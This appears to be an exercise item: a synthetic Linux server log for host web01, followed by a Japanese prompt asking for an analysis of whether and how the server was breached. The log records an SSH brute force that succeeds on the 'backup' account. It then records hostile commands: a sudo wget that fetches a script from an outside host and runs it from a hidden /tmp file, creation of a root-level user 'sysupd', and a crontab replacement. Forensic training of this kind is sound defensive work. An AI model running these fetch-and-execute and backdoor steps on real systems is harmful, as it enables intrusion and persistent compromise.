@@ -1,0 +1,79 @@
+```
+Oct 12 00:00:36 web01 nginx: 10.20.5.64 - - "GET /index.html HTTP/1.1" 200 6917 "-" "Mozilla/5.0"
+Oct 12 00:01:05 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.24 DST=10.20.0.5 PROTO=TCP SPT=64270 DPT=8080
+Oct 12 00:01:34 web01 nginx: 10.20.4.131 - - "GET /static/app.js HTTP/1.1" 200 36981 "-" "Mozilla/5.0"
+Oct 12 00:02:47 web01 CRON[14031]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+Oct 12 00:03:49 web01 nginx: 10.20.5.209 - - "GET /news/2026/10 HTTP/1.1" 200 10663 "-" "Mozilla/5.0"
+Oct 12 00:04:11 web01 sshd[46753]: Accepted publickey for suzuki from 10.20.4.247 port 53848 ssh2
+Oct 12 00:05:10 web01 nginx: 10.20.7.26 - - "GET /login HTTP/1.1" 200 39765 "-" "Mozilla/5.0"
+Oct 12 00:05:38 web01 systemd[1]: Started logrotate.service.
+Oct 12 00:06:18 web01 nginx: 10.20.5.214 - - "GET /static/style.css HTTP/1.1" 404 23900 "-" "Mozilla/5.0"
+Oct 12 00:07:22 web01 systemd[1]: Started logrotate.service.
+Oct 12 00:07:58 web01 systemd[1]: Started logrotate.service.
+Oct 12 00:08:12 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.99 DST=10.20.0.5 PROTO=TCP SPT=47628 DPT=3389
+Oct 12 00:09:13 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.43 DST=10.20.0.5 PROTO=TCP SPT=60830 DPT=3389
+Oct 12 00:10:28 web01 CRON[24283]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+Oct 12 00:10:45 web01 CRON[46994]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)
+Oct 12 00:10:56 web01 nginx: 10.20.4.43 - - "GET /api/v1/status HTTP/1.1" 304 17891 "-" "Mozilla/5.0"
+Oct 12 00:12:24 web01 systemd[1]: Started apt-daily.service.
+Oct 12 00:13:38 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.200 DST=10.20.0.5 PROTO=TCP SPT=50626 DPT=23
+Oct 12 00:13:44 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.104 DST=10.20.0.5 PROTO=TCP SPT=41051 DPT=3389
+Oct 12 00:14:00 web01 sshd[5337]: Failed password for invalid user pi from 192.0.2.226 port 46913 ssh2
+Oct 12 00:14:35 web01 nginx: 10.20.8.103 - - "GET /static/style.css HTTP/1.1" 304 9563 "-" "Mozilla/5.0"
+Oct 12 00:15:01 web01 nginx: 10.20.9.139 - - "GET /login HTTP/1.1" 404 28277 "-" "Mozilla/5.0"
+Oct 12 00:15:58 web01 sshd[59839]: Accepted publickey for suzuki from 10.20.3.132 port 59121 ssh2
+Oct 12 00:17:05 web01 systemd[1]: Started logrotate.service.
+Oct 12 00:18:11 web01 nginx: 10.20.7.154 - - "GET / HTTP/1.1" 304 25209 "-" "Mozilla/5.0"
+Oct 12 00:18:43 web01 sshd[40052]: pam_unix(sshd:session): session opened for user tanaka(uid=1000) by (uid=0)
+Oct 12 00:19:39 web01 nginx: 10.20.9.194 - - "GET /login HTTP/1.1" 200 7510 "-" "Mozilla/5.0"
+Oct 12 00:19:51 web01 nginx: 10.20.1.246 - - "GET /static/style.css HTTP/1.1" 200 33006 "-" "Mozilla/5.0"
+Oct 12 00:19:52 web01 sshd[5652]: Failed password for root from 203.0.113.45 port 63194 ssh2
+Oct 12 00:19:54 web01 sshd[42359]: Failed password for root from 203.0.113.45 port 41929 ssh2
+Oct 12 00:19:55 web01 sshd[16003]: Failed password for root from 203.0.113.45 port 42208 ssh2
+Oct 12 00:19:57 web01 sshd[60337]: Failed password for root from 203.0.113.45 port 41029 ssh2
+Oct 12 00:19:59 web01 sshd[57337]: Failed password for root from 203.0.113.45 port 50827 ssh2
+Oct 12 00:20:01 web01 sshd[5643]: Failed password for root from 203.0.113.45 port 56847 ssh2
+Oct 12 00:20:03 web01 sshd[16597]: Failed password for root from 203.0.113.45 port 49125 ssh2
+Oct 12 00:20:05 web01 sshd[44842]: Failed password for root from 203.0.113.45 port 55906 ssh2
+Oct 12 00:20:08 web01 sshd[15040]: Failed password for root from 203.0.113.45 port 57669 ssh2
+Oct 12 00:20:11 web01 sshd[9671]: Failed password for root from 203.0.113.45 port 63702 ssh2
+Oct 12 00:20:14 web01 sshd[62309]: Failed password for root from 203.0.113.45 port 58711 ssh2
+Oct 12 00:20:17 web01 sshd[38762]: Failed password for root from 203.0.113.45 port 55488 ssh2
+Oct 12 00:20:20 web01 sshd[16925]: Failed password for root from 203.0.113.45 port 55498 ssh2
+Oct 12 00:20:22 web01 sshd[53920]: Failed password for root from 203.0.113.45 port 53338 ssh2
+Oct 12 00:20:23 web01 sshd[13478]: Failed password for root from 203.0.113.45 port 43090 ssh2
+Oct 12 00:20:24 web01 sshd[7352]: Failed password for root from 203.0.113.45 port 61593 ssh2
+Oct 12 00:20:26 web01 sshd[29249]: Failed password for root from 203.0.113.45 port 51609 ssh2
+Oct 12 00:20:27 web01 sshd[28759]: Failed password for root from 203.0.113.45 port 53470 ssh2
+Oct 12 00:20:28 web01 sshd[31606]: Failed password for root from 203.0.113.45 port 63890 ssh2
+Oct 12 00:20:31 web01 sshd[4550]: Failed password for root from 203.0.113.45 port 62064 ssh2
+Oct 12 00:20:34 web01 sshd[43824]: Failed password for backup from 203.0.113.45 port 61174 ssh2
+Oct 12 00:20:37 web01 sshd[7449]: Failed password for backup from 203.0.113.45 port 41986 ssh2
+Oct 12 00:20:38 web01 sshd[27386]: Failed password for backup from 203.0.113.45 port 63862 ssh2
+Oct 12 00:20:41 web01 sshd[23236]: Failed password for backup from 203.0.113.45 port 43580 ssh2
+Oct 12 00:20:43 web01 sshd[48211]: Accepted password for backup from 203.0.113.45 port 51122 ssh2
+Oct 12 00:20:44 web01 sshd[48211]: pam_unix(sshd:session): session opened for user backup(uid=1003) by (uid=0)
+Oct 12 00:20:45 web01 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/wget -q http://198.51.100.23/upd.sh -O /tmp/.upd.sh
+Oct 12 00:20:48 web01 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash /tmp/.upd.sh
+Oct 12 00:20:50 web01 useradd[48302]: new user: name=sysupd, UID=0, GID=0, home=/root, shell=/bin/bash
+Oct 12 00:20:53 web01 crontab[48317]: (root) REPLACE (root)
+Oct 12 00:20:56 web01 sshd[48211]: Disconnected from user backup 203.0.113.45 port 51122
+Oct 12 00:21:21 web01 sshd[50935]: pam_unix(sshd:session): session opened for user tanaka(uid=1000) by (uid=0)
+Oct 12 00:21:33 web01 nginx: 10.20.9.157 - - "GET /index.html HTTP/1.1" 200 24704 "-" "Mozilla/5.0"
+Oct 12 00:22:43 web01 sshd[50971]: pam_unix(sshd:session): session opened for user tanaka(uid=1000) by (uid=0)
+Oct 12 00:22:58 web01 sshd[40252]: pam_unix(sshd:session): session opened for user tanaka(uid=1000) by (uid=0)
+Oct 12 00:23:26 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.214 DST=10.20.0.5 PROTO=TCP SPT=51894 DPT=3389
+Oct 12 00:23:39 web01 nginx: 10.20.2.23 - - "GET /static/style.css HTTP/1.1" 304 4735 "-" "Mozilla/5.0"
+Oct 12 00:25:00 web01 systemd[1]: Started apt-daily.service.
+Oct 12 00:25:13 web01 sshd[44237]: Failed password for invalid user test from 192.0.2.69 port 55574 ssh2
+Oct 12 00:25:48 web01 sshd[35581]: Accepted publickey for suzuki from 10.20.9.195 port 59876 ssh2
+Oct 12 00:26:44 web01 nginx: 10.20.5.104 - - "GET /static/style.css HTTP/1.1" 200 28911 "-" "Mozilla/5.0"
+Oct 12 00:27:04 web01 sshd[59957]: pam_unix(sshd:session): session opened for user suzuki(uid=1001) by (uid=0)
+Oct 12 00:28:21 web01 sshd[15725]: Accepted publickey for suzuki from 10.20.4.3 port 42098 ssh2
+```
+
+上記は Linux サーバー web01 のログです。このログを分析し、次の4点を日本語の箇条書き（各1行、計4行）で答えてください。
+(1) 侵害の有無
+(2) 攻撃元の IP アドレス
+(3) 侵入に成功した時刻
+(4) 侵入後の不審な操作
